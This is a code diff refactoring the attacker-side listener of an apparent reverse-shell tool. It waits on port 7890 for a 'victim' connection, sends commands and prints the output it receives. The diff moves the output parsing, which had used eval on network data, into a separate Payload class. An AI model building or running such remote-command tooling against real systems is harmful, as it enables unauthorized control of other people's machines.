@@ -1,32 +1,12 @@
 import socket
 import sys
+from payload import Payload
 
 # Port listening for the victim's connection
 port = 7890
 
 # Style out prompt and output
 output_style = "full"
-
-
-# Format client payload to string output
-def format_output(payload):
-    payload = payload.decode('utf-8')
-    payload = eval(payload)
-    stdout, stderr = payload[0], payload[1]
-    if len(stdout) == 0 and len(stderr) == 0:
-        return ""
-    result = ""
-    if output_style == "full":
-        result += 'Received'.center(40, "=") + '\n'
-        if len(stdout) != 0:
-            result += ("Command stdout".center(20, "=")) + '\n'
-            result += str(stdout) + '\n'
-        if len(stderr) != 0:
-            result += ("Command stderr".center(20, "=")) + '\n'
-            result += str(stderr) + '\n'
-    else:
-        result += stdout + '\n' + stderr
-    return result
 
 
 # Custom command behaviour
@@ -79,8 +59,10 @@ def create_socket():
         command = bytes(command, encoding='utf-8')
         connection.sendall(command)
 
-        payload = connection.recv(1024)
-        print(format_output(payload))
+        packet = connection.recv(1024)
+        payload = Payload(raw_packet=packet)
+
+        print(payload.format_output(output_style))
 
 
 def show_logo():
